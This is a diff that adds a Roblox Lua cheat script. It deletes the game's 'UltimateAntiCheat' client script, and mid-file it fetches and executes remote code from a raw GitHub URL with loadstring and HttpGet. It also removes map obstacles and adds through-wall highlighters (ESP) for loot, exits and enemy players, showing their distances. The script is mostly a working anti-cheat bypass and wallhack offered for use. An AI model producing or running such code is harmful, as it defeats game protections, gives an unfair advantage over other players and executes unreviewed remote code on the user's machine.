@@ -1,0 +1,554 @@
+--// UAC BYPASS
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local playerGuiTarget = LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGui"):WaitForChild("Scripts"):FindFirstChild("UltimateAntiCheat")
+if playerGuiTarget then
+    playerGuiTarget:Destroy()
+end
+
+--// MessageBox
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local Player = Players.LocalPlayer
+
+-- Create ScreenGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "LoadingMessage"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = game:GetService("CoreGui")
+
+-- Main Message Frame
+local MessageFrame = Instance.new("Frame")
+MessageFrame.Name = "LoadingFrame"
+MessageFrame.Size = UDim2.new(0, 300, 0, 80)
+MessageFrame.Position = UDim2.new(1, -320, 1, -100)  -- Bottom right
+MessageFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+MessageFrame.BorderSizePixel = 0
+MessageFrame.Parent = ScreenGui
+
+-- Corner rounding
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 12)
+UICorner.Parent = MessageFrame
+
+-- Stroke border
+local UIStroke = Instance.new("UIStroke")
+UIStroke.Color = Color3.fromRGB(100, 150, 255)
+UIStroke.Thickness = 2
+UIStroke.Parent = MessageFrame
+
+-- Loading Dots Animation Frame
+local DotsFrame = Instance.new("Frame")
+DotsFrame.Size = UDim2.new(0, 60, 0, 40)
+DotsFrame.Position = UDim2.new(0, 20, 0.5, -20)
+DotsFrame.BackgroundTransparency = 1
+DotsFrame.Parent = MessageFrame
+
+-- Dots
+local Dot1 = Instance.new("Frame")
+Dot1.Size = UDim2.new(0, 8, 0, 8)
+Dot1.Position = UDim2.new(0, 0, 0.5, -4)
+Dot1.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
+Dot1.Parent = DotsFrame
+
+local Dot1Corner = Instance.new("UICorner")
+Dot1Corner.CornerRadius = UDim.new(1, 0)
+Dot1Corner.Parent = Dot1
+
+local Dot2 = Instance.new("Frame")
+Dot2.Size = UDim2.new(0, 8, 0, 8)
+Dot2.Position = UDim2.new(0, 18, 0.5, -4)
+Dot2.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
+Dot2.Parent = DotsFrame
+
+local Dot2Corner = Instance.new("UICorner")
+Dot2Corner.CornerRadius = UDim.new(1, 0)
+Dot2Corner.Parent = Dot2
+
+local Dot3 = Instance.new("Frame")
+Dot3.Size = UDim2.new(0, 8, 0, 8)
+Dot3.Position = UDim2.new(0, 36, 0.5, -4)
+Dot3.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
+Dot3.Parent = DotsFrame
+
+local Dot3Corner = Instance.new("UICorner")
+Dot3Corner.CornerRadius = UDim.new(1, 0)
+Dot3Corner.Parent = Dot3
+
+-- Text
+local LoadingLabel = Instance.new("TextLabel")
+LoadingLabel.Size = UDim2.new(1, -100, 1, 0)
+LoadingLabel.Position = UDim2.new(0, 90, 0, 0)
+LoadingLabel.BackgroundTransparency = 1
+LoadingLabel.Text = "bypassing AntiFun"
+LoadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+LoadingLabel.TextSize = 24
+LoadingLabel.Font = Enum.Font.GothamBold
+LoadingLabel.TextXAlignment = Enum.TextXAlignment.Left
+LoadingLabel.Parent = MessageFrame
+
+--// ANIMATIONS
+-- Slide in from right
+local slideIn = TweenService:Create(
+    MessageFrame,
+    TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+    {Position = UDim2.new(1, -320, 1, -100)}
+)
+
+-- Animate dots (bouncing)
+local function animateDots()
+    local tween1 = TweenService:Create(Dot1, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Position = UDim2.new(0, 0, 0.5, -8)})
+    local tween2 = TweenService:Create(Dot2, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true, 0.4), {Position = UDim2.new(0, 18, 0.5, -8)})
+    local tween3 = TweenService:Create(Dot3, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true, 0.8), {Position = UDim2.new(0, 36, 0.5, -8)})
+    
+    tween1:Play()
+    tween2:Play()
+    tween3:Play()
+end
+
+-- Slide out to right
+local slideOut = TweenService:Create(
+    MessageFrame,
+    TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In),
+    {Position = UDim2.new(1, 0, 1, -100)}
+)
+
+--// SHOW MESSAGEBOX
+local function showLoadingMessage()
+    -- Start invisible off-screen
+    MessageFrame.Position = UDim2.new(1, 0, 1, -100)
+    MessageFrame.Visible = true
+    
+    -- Slide in + animate dots
+    slideIn:Play()
+    animateDots()
+    
+    task.wait(3)
+    
+    -- Slide out
+    slideOut:Play()
+    slideOut.Completed:Connect(function()
+        MessageFrame.Visible = false
+        ScreenGui:Destroy()
+    end)
+end
+
+--// START THE MESSAGEBOX
+showLoadingMessage()
+
+task.wait(5)
+
+-- Delete from StarterGui (template for new players)
+pcall(function()
+    local starterGuiTarget = game:GetService("StarterGui"):WaitForChild("MainGui"):WaitForChild("Scripts"):FindFirstChild("UltimateAntiCheat")
+    if starterGuiTarget then
+        starterGuiTarget:Destroy()
+    end
+end)
+
+-- Also check ReplicatedStorage (sometimes scripts are stored there)
+pcall(function()
+    local rsTarget = game:GetService("ReplicatedStorage"):FindFirstChild("MainGui")
+    if rsTarget then
+        local scripts = rsTarget:FindFirstChild("Scripts")
+        if scripts then
+            local lolScript = scripts:FindFirstChild("UltimateAntiCheat")
+            if lolScript then
+                lolScript:Destroy()    
+            end
+        end
+    end
+end)
+
+print("Bypassed")
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/halien298/random/refs/heads/main/ai'),true))()
+
+--// Delete specific unwanted objects from Workspace
+local targets = {
+["Tree1"] = true,
+["Tree2"] = true,
+["Tree3"] = true,
+["Tree4"] = true,
+["Tree5"] = true,
+["Barrier"] = true,
+["Bush1"] = true
+}
+
+local removed = 0
+
+for _, obj in ipairs(workspace:GetDescendants()) do
+if targets[obj.Name] then
+obj:Destroy()
+removed += 1
+end
+end
+
+print(("🪓 Removed %d unwanted objects."):format(removed))
+
+--// Unified Loot + Supply Highlighter
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+local Player = Players.LocalPlayer
+
+-- Names of everything you want highlighted
+local TARGET_NAMES = {
+-- Supply drops
+["SupplyDropMilitary_XMAS"] = true,
+["SupplyDropMilitary"] = true,
+["MilitaryCrate"] = true,
+["LargeMilitaryBox"] = true,
+["SmallMilitaryBox"] = true,
+-- Loot crates / objects
+["GrenadeCrate"] = true,
+["HiddenCache"] = true,
+["LargeABPOPABox"] = true,
+["CashRegister"] = true,
+["MedBag"] = true,
+["SatchelBag"] = true,
+["SmallShippingCrate"] = true,
+}
+
+-- Visual settings
+local FILL_TRANSP = 0.65
+local OUTLINE_TRANSP = 0
+local TEXT_MIN, TEXT_MAX = 10, 22
+local TEXT_OFFSET = Vector3.new(0, 4, 0)
+local tracked = {}
+
+-- Helpers
+local function getAnyPart(obj)
+if obj:IsA("BasePart") then return obj end
+if obj:IsA("Model") then
+return obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart", true)
+end
+end
+
+local function addTracker(obj)
+if tracked[obj] then return end
+local part = getAnyPart(obj)
+if not part then return end
+
+local h = Instance.new("Highlight")
+h.Name = "LootHighlight"
+h.Adornee = obj
+h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+h.FillTransparency = FILL_TRANSP
+h.OutlineTransparency = OUTLINE_TRANSP
+h.OutlineColor = Color3.fromRGB(200,140,255)
+h.Parent = CoreGui	-- always visible
+
+local bb = Instance.new("BillboardGui")
+bb.Name = "LootBillboard"
+bb.AlwaysOnTop = true
+bb.Size = UDim2.new(0, 240, 0, 38)
+bb.StudsOffset = TEXT_OFFSET
+bb.Adornee = part
+bb.Parent = CoreGui
+
+local lbl = Instance.new("TextLabel")
+lbl.Size = UDim2.new(1,0,1,0)
+lbl.BackgroundTransparency = 1
+lbl.Font = Enum.Font.SourceSansBold
+lbl.TextColor3 = Color3.fromRGB(255,255,255)
+lbl.TextStrokeTransparency = 0.3
+lbl.TextScaled = false
+lbl.TextSize = 20
+lbl.Text = obj.Name
+lbl.Parent = bb
+
+tracked[obj] = {Part = part, Highlight=h, Billboard=bb, Label=lbl}
+end
+
+local function removeTracker(obj)
+local data = tracked[obj]
+if not data then return end
+for _,inst in pairs(data) do pcall(function() inst:Destroy() end) end
+tracked[obj] = nil
+end
+
+-- Initial scan + new additions
+for _,desc in ipairs(workspace:GetDescendants()) do
+if TARGET_NAMES[desc.Name] then
+addTracker(desc)
+end
+end
+
+workspace.DescendantAdded:Connect(function(obj)
+if TARGET_NAMES[obj.Name] then addTracker(obj) end
+end)
+
+workspace.DescendantRemoving:Connect(function(obj)
+if tracked[obj] then removeTracker(obj) end
+end)
+
+-- Color animation + live distance / text-size update
+local hue = 0
+RunService.RenderStepped:Connect(function(dt)
+hue = (hue + dt * 0.2) % 1
+local color = Color3.fromHSV(hue, 0.7, 1)
+local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
+
+for obj,data in pairs(tracked) do
+	if obj.Parent and data.Part and data.Label then
+		data.Highlight.OutlineColor = color
+
+		if root then
+			local dist = (root.Position - data.Part.Position).Magnitude
+			local size = math.clamp(TEXT_MAX - dist*0.05, TEXT_MIN, TEXT_MAX)
+			data.Label.TextSize = size
+			data.Label.Text = string.format("%s  [%.0f studs]", obj.Name, dist)
+		else
+			data.Label.TextSize = TEXT_MAX
+			data.Label.Text = obj.Name
+		end
+	else
+		removeTracker(obj)
+	end
+end
+end)
+
+--// Player Highlighter v2 – red/green + names + distance
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+--== CONFIG ==--
+local COLOR_ENEMY = Color3.fromRGB(255, 60, 60)
+local COLOR_TEAM = Color3.fromRGB(0, 255, 100)
+local TEXT_COLOR_EN = Color3.fromRGB(255, 80, 80)
+local TEXT_COLOR_TM = Color3.fromRGB(0, 255, 120)
+local TRANSPARENCY = 0.2
+local FILL_TRANSP = 1 -- 1 = no fill, just outline
+local STUDS_OFFSET = 4
+local MIN_SIZE, MAX_SIZE = 10, 22
+local tracked = {}
+
+-- create highlight + billboard
+local function makeHighlight(char, plr)
+if not char or not plr then return end
+if tracked[plr] then
+for _,inst in pairs(tracked[plr]) do pcall(function() inst:Destroy() end) end
+end
+
+-- choose colors
+local isTeam
+if LocalPlayer.Team and plr.Team and LocalPlayer.Team == plr.Team then
+	isTeam = true
+end
+local outlineColor = isTeam and COLOR_TEAM or COLOR_ENEMY
+local textColor    = isTeam and TEXT_COLOR_TM or TEXT_COLOR_EN
+
+-- highlight
+local h = Instance.new("Highlight")
+h.Name = "PlayerHighlight"
+h.Adornee = char
+h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+h.FillTransparency   = FILL_TRANSP
+h.OutlineTransparency = TRANSPARENCY
+h.OutlineColor = outlineColor
+h.Parent = char
+
+-- billboard for name + distance
+local head = char:FindFirstChild("Head")
+if not head then return end
+local bb = Instance.new("BillboardGui")
+bb.Name = "NameBillboard"
+bb.AlwaysOnTop = true
+bb.Size = UDim2.new(0,200,0,40)
+bb.StudsOffset = Vector3.new(0, STUDS_OFFSET, 0)
+bb.Adornee = head
+bb.Parent = char
+
+local lbl = Instance.new("TextLabel")
+lbl.Size = UDim2.new(1,0,1,0)
+lbl.BackgroundTransparency = 1
+lbl.Font = Enum.Font.SourceSansBold
+lbl.TextColor3 = textColor
+lbl.TextStrokeTransparency = 0.3
+lbl.TextSize = 20
+lbl.TextScaled = false
+lbl.Text = plr.Name
+lbl.Parent = bb
+
+tracked[plr] = {Highlight=h, Billboard=bb, Label=lbl, Character=char}
+end
+
+-- remove when player leaves
+local function removeHighlight(plr)
+local t = tracked[plr]
+if t then
+for _,inst in pairs(t) do pcall(function() inst:Destroy() end) end
+tracked[plr]=nil
+end
+end
+
+-- hook players
+local function bindPlayer(plr)
+if plr == LocalPlayer then return end
+if plr.Character then makeHighlight(plr.Character, plr) end
+plr.CharacterAdded:Connect(function(c) makeHighlight(c, plr) end)
+plr.CharacterRemoving:Connect(function() removeHighlight(plr) end)
+end
+
+for _,p in ipairs(Players:GetPlayers()) do bindPlayer(p) end
+Players.PlayerAdded:Connect(bindPlayer)
+Players.PlayerRemoving:Connect(removeHighlight)
+
+-- live distance & text‑size update
+RunService.RenderStepped:Connect(function()
+local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+for plr,data in pairs(tracked) do
+if plr.Character and plr.Character.Parent and data.Label then
+if root and plr.Character:FindFirstChild("HumanoidRootPart") then
+local dist = (root.Position - plr.Character.HumanoidRootPart.Position).Magnitude
+local size = math.clamp(MAX_SIZE - dist*0.05, MIN_SIZE, MAX_SIZE)
+data.Label.TextSize = size
+data.Label.Text = string.format("%s [%.0f studs]", plr.Name, dist)
+else
+data.Label.Text = plr.Name
+end
+end
+end
+end)
+
+--// Exit Highlighter
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+local Player = Players.LocalPlayer
+
+-- Settings
+local TARGET_NAME = "Exit"
+local OUTLINE_COLOR = Color3.fromRGB(0,255,100)
+local TEXT_COLOR = Color3.fromRGB(0,255,120)
+local TEXT_OFFSET = Vector3.new(0,15,0) -- how high text floats
+local TEXT_MIN, TEXT_MAX = 12, 28
+local FILL_TRANSP = 0.7
+local tracked = {}
+
+-- Helper: find any BasePart inside Model or itself
+local function getAnyPart(obj)
+if obj:IsA("BasePart") then return obj end
+if obj:IsA("Model") then
+return obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart", true)
+end
+end
+
+-- Create highlighter/label
+local function addExit(obj)
+if tracked[obj] then return end
+local part = getAnyPart(obj)
+if not part then return end
+
+-- Green outline
+local h = Instance.new("Highlight")
+h.Name = "ExitHighlight"
+h.Adornee = obj
+h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+h.FillTransparency = FILL_TRANSP
+h.OutlineTransparency = 0
+h.OutlineColor = OUTLINE_COLOR
+h.Parent = CoreGui
+
+-- Floating EXIT label
+local bb = Instance.new("BillboardGui")
+bb.Name = "ExitBillboard"
+bb.AlwaysOnTop = true
+bb.Size = UDim2.new(0,300,0,50)
+bb.StudsOffset = TEXT_OFFSET
+bb.Adornee = part
+bb.Parent = CoreGui
+
+local lbl = Instance.new("TextLabel")
+lbl.Size = UDim2.new(1,0,1,0)
+lbl.BackgroundTransparency = 1
+lbl.Font = Enum.Font.SourceSansBold
+lbl.TextColor3 = TEXT_COLOR
+lbl.TextStrokeTransparency = 0.3
+lbl.TextScaled = false
+lbl.TextSize = 24
+lbl.Text = "EXIT"
+lbl.Parent = bb
+
+tracked[obj] = {Part=part,Highlight=h,Billboard=bb,Label=lbl}
+end
+
+-- Remove if object deleted
+local function removeExit(obj)
+local d = tracked[obj]
+if not d then return end
+for _,inst in pairs(d) do pcall(function() inst:Destroy() end) end
+tracked[obj] = nil
+end
+
+-- Initial scan + listeners
+for _,desc in ipairs(workspace:GetDescendants()) do
+if desc.Name == TARGET_NAME then addExit(desc) end
+end
+
+workspace.DescendantAdded:Connect(function(o)
+if o.Name == TARGET_NAME then addExit(o) end
+end)
+workspace.DescendantRemoving:Connect(function(o)
+if tracked[o] then removeExit(o) end
+end)
+
+-- Distance updates + text scaling
+RunService.RenderStepped:Connect(function()
+local root = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
+for obj,data in pairs(tracked) do
+if obj.Parent and data.Part and data.Label then
+if root then
+local dist = (root.Position - data.Part.Position).Magnitude
+local size = math.clamp(TEXT_MAX - dist*0.05, TEXT_MIN, TEXT_MAX)
+data.Label.TextSize = size
+data.Label.Text = string.format("EXIT [%.0f studs]", dist)
+else
+data.Label.Text = "EXIT"
+end
+else
+removeExit(obj)
+end
+end
+end)
+
+--// Replace only your ItemRoot.Sounds.FireSound
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local NEW_ID = "rbxassetid://2476570846"
+
+local function replaceSound(char)
+local fireSound = char:FindFirstChild("ItemRoot", true)
+if fireSound and fireSound:FindFirstChild("Sounds") then
+local soundsFolder = fireSound.Sounds
+local fs = soundsFolder:FindFirstChild("FireSound")
+if fs and fs:IsA("Sound") then
+fs.SoundId = NEW_ID
+print("🔥 FireSound replaced on", LocalPlayer.Name)
+end
+end
+end
+
+-- When you spawn (or respawn), update sound
+LocalPlayer.CharacterAdded:Connect(function(char)
+char:WaitForChild("HumanoidRootPart") -- ensure character loaded
+task.wait(0.1)
+replaceSound(char)
+
+-- Also catch it if that FireSound is created later
+char.DescendantAdded:Connect(function(d)
+	if d.Name == "FireSound" and d:IsA("Sound") 
+	and d.Parent and d.Parent.Name == "Sounds" then
+		d.SoundId = NEW_ID
+		print("🔥 FireSound auto‑replaced (new instance)")
+	end
+end)
+end)
+
+-- if character exists already
+if LocalPlayer.Character then
+replaceSound(LocalPlayer.Character)
+end
